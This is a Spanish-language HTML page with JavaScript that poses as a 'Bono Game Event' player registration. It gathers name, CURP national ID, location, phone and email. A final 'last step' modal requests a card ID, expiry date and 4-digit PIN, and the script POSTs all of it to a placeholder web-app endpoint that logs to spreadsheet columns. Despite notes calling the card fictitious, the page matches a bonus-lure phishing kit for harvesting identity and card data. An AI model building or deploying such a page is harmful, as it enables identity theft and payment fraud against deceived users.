<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Registro | Bono Game Event</title>
  <style>
    :root{--v:#1f2430;--g:#7e57c2;--d:#ffd166;--bg:#f6f7fb}
    *{box-sizing:border-box} body{font-family:Arial,sans-serif;margin:0;background:var(--bg);color:#222}
    header{background:var(--v);color:#fff;padding:14px 8%;border-bottom:4px solid var(--d)}
    .container{max-width:920px;margin:28px auto;background:#fff;padding:28px;border-radius:6px;box-shadow:0 4px 12px rgba(0,0,0,.12)}
    h2{margin-top:0;color:var(--g)} .grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}.full{grid-column:1/-1}
    label{display:block;font-weight:700;color:var(--v);margin-bottom:6px} input,select{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px}
    button{width:100%;padding:12px;border:0;border-radius:4px;background:var(--g);color:#fff;font-weight:700;cursor:pointer}
    .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:10;padding:16px}
    .modal-content{background:#fff;max-width:620px;width:100%;margin:6% auto;padding:24px;border-top:10px solid var(--g);border-radius:8px}
    .status{margin-top:10px;font-size:.92rem;color:#555}@media (max-width:700px){.grid{grid-template-columns:1fr}}
  </style>
</head>
<body>
<header><strong>Bono Game Event | Registro</strong></header>

<div id="welcomeModal" class="modal" style="display:block">
  <div class="modal-content">
    <h3>Bienvenido al evento del juego</h3>
    <p>Este formulario guarda datos de prueba para el evento. No uses datos bancarios reales.</p>
    <button type="button" id="btnWelcomeClose">Entendido y continuar</button>
  </div>
</div>

<div id="cardModal" class="modal">
  <div class="modal-content">
    <h3>ULTIMO PASO...</h3>
    <p>Captura los datos de la tarjeta ficticia del juego para recibir el bono in-game.</p>
    <div class="grid">
      <div class="full"><label for="tarjeta">Tarjeta del juego (ID)</label><input id="tarjeta" maxlength="20" pattern="[A-Za-z0-9]{8,20}" placeholder="Ej: AB12CD34EF56" required></div>
      <div><label for="expMes">Mes</label><input id="expMes" maxlength="2" pattern="(0[1-9]|1[0-2])" placeholder="MM" required></div>
      <div><label for="expAnio">Año</label><input id="expAnio" maxlength="2" pattern="[0-9]{2}" placeholder="AA" required></div>
      <div class="full"><label for="expPin">PIN del juego (4)</label><input id="expPin" maxlength="4" pattern="[0-9]{4}" required></div>
      <div class="full"><button type="button" id="btnFinalizar">Finalizar registro</button></div>
      <div class="full status" id="cardStatus"></div>
    </div>
  </div>
</div>

<div class="container">
  <h2>Registro de Jugador</h2>
  <form id="formBono" class="grid">
    <div class="full"><label for="nombre">Nombre</label><input id="nombre" required></div>
    <div><label for="fecha">Fecha</label><input type="date" id="fecha" required></div>
    <div><label for="curp">Curp (alias/ID jugador)</label><input id="curp" maxlength="18" required></div>
    <div><label for="estado">Estado</label><select id="estado" required><option value="">Seleccione...</option><option>Aguascalientes</option><option>Baja California</option><option>Baja California Sur</option><option>Campeche</option><option>Chiapas</option><option>Chihuahua</option><option>Ciudad de México</option><option>Coahuila</option><option>Colima</option><option>Durango</option><option>Estado de México</option><option>Guanajuato</option><option>Guerrero</option><option>Hidalgo</option><option>Jalisco</option><option>Michoacán</option><option>Morelos</option><option>Nayarit</option><option>Nuevo León</option><option>Oaxaca</option><option>Puebla</option><option>Querétaro</option><option>Quintana Roo</option><option>San Luis Potosí</option><option>Sinaloa</option><option>Sonora</option><option>Tabasco</option><option>Tamaulipas</option><option>Tlaxcala</option><option>Veracruz</option><option>Yucatán</option><option>Zacatecas</option></select></div>
    <div><label for="ciudad">Ciudad</label><input id="ciudad" required></div>
    <div><label for="numeroCel">NumeroCel</label><input id="numeroCel" type="tel" pattern="[0-9]{10}" required></div>
    <div><label for="codigoPost">CodigoPost</label><input id="codigoPost" pattern="[0-9]{5}" required></div>
    <div><label for="correo">Correo</label><input id="correo" type="email" required></div>
    <div class="full"><button type="submit">Continuar al último paso</button></div>
  </form>
</div>

<script>
(() => {
  const API_URL = 'PEGA_AQUI_URL_WEBAPP';
  const $ = (id) => document.getElementById(id);
  const payload = {};

  $('btnWelcomeClose').addEventListener('click', () => $('welcomeModal').style.display = 'none');

  $('formBono').addEventListener('submit', (e) => {
    e.preventDefault();
    const form = e.currentTarget;
    if (!form.checkValidity()) return form.reportValidity();
    payload.nombre = $('nombre').value.trim();
    payload.fecha = $('fecha').value;
    payload.estado = $('estado').value;
    payload.ciudad = $('ciudad').value.trim();
    payload.curp = $('curp').value.trim().toUpperCase();
    payload.numeroCel = $('numeroCel').value.trim();
    payload.codigoPost = $('codigoPost').value.trim();
    payload.correo = $('correo').value.trim().toLowerCase();
    $('cardModal').style.display = 'block';
    $('cardStatus').textContent = '';
  });

  $('btnFinalizar').addEventListener('click', async () => {
    const t = $('tarjeta'), m = $('expMes'), a = $('expAnio'), p = $('expPin');
    if (!t.checkValidity() || !m.checkValidity() || !a.checkValidity() || !p.checkValidity()) {
      $('cardStatus').textContent = 'Revisa ID de tarjeta, fecha o PIN del juego.';
      return;
    }
    payload.tarjeta = t.value.trim();
    payload.fechaTarjeta = `${m.value}/${a.value}`; // Columna H: Fecha
    payload.exp = p.value.trim(); // Columna I: Exp

    $('btnFinalizar').disabled = true;
    $('cardStatus').textContent = 'Guardando...';
    try {
      const r = await fetch(API_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
      const j = await r.json();
      if (!r.ok || !j.ok) throw new Error(j.error || ('HTTP ' + r.status));
      $('cardModal').style.display = 'none';
      alert('Registro completado con éxito.');
      $('formBono').reset();
    } catch (err) {
      $('cardStatus').textContent = 'Error: ' + err.message;
    } finally {
      $('btnFinalizar').disabled = false;
    }
  });
})();
</script>
</body>
</html>
